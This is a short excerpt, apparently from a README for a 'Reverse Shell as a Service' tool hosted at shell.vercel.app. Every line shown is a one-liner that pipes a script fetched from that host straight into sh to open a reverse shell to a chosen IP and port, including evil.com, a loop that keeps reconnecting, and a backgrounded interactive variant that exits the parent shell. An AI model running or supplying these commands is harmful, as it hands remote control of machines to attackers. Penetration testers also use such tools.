...
> Reverse Shell as a Service - https://shell.vercel.app
...
```shell
curl https://shell.vercel.app/api/192.168.0.69:1337 | sh
```
...
```shell
curl https://shell.vercel.app/api/localhost:1337 | sh
```
...
```shell
curl https://shell.vercel.app/api/evil.com:1337 | sh
```
...
```shell
while true; do curl https://shell.vercel.app/api/yourip:1337 | sh; done
```
...
```shell
sh -c "curl https://shell.vercel.app/api/localhost:1337 | sh -i &" && exit
```
